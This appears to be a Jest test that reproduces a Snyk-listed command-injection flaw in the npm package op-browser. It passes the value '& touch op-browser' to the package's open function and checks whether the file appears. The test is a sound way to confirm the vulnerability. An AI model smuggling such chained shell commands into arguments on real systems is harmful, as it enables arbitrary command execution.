//https://snyk.io/vuln/SNYK-JS-OPBROWSER-564259
test("Command Injection in op-browser", () => {
  expect.assertions(2);
  const root = require("op-browser");
  const fs = require("fs");
  const path = "./op-browser";
  const sleep = require("sleep");
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  let run = root.open("chrome", "& touch op-browser", "", "");
  run.then(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, function (err) {});
  });
});
